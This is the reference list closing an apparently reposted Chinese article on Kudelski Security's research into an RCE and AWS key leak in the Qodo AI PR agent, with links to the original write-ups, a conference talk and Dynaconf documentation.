 《How We Exploited Qodo: From a PR Comment to RCE and an AWS Admin Key - Leaked Twice》: https://kudelskisecurity.com/research/qodo-dynaconf-aws-admin-key-leaked-twice  
[2]  
 Black Hat USA: https://kudelskisecurity.com/research/hack-to-the-future-slides-and-content  
[3]  
 2 个漏洞: https://kudelskisecurity.com/research/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent#toc-leaking-github-repository-secrets  
[4]  
 38C3: https://www.youtube.com/watch?v=uDksY6ji-dk  
[5]  
 对 CodeRabbit 的研究: https://kudelskisecurity.com/research/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories  
[6]  
 Dynaconf: https://www.dynaconf.com/  
[7]  
 动态变量: https://www.dynaconf.com/dynamic/  
[8]  
 权限集: https://api.github.com/apps/qodo-code-review  
[9]  
 Dynaconf 支持使用 `.py` 文件作为配置文件: https://www.dynaconf.com/settings_files/#supported-formats  
[10]  
 v0.29: https://github.com/qodo-ai/pr-agent/releases/tag/v0.29  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVcSpIgwrLGPLCPun8vkltgvdttWJoSTM06jHqPSzZmYSDGahWHZfiagg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoV7g0HDZr2NX7A8sWT9weJdKptvcOhEKia9QbF6zicOXheXxp0fyFVru4A/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
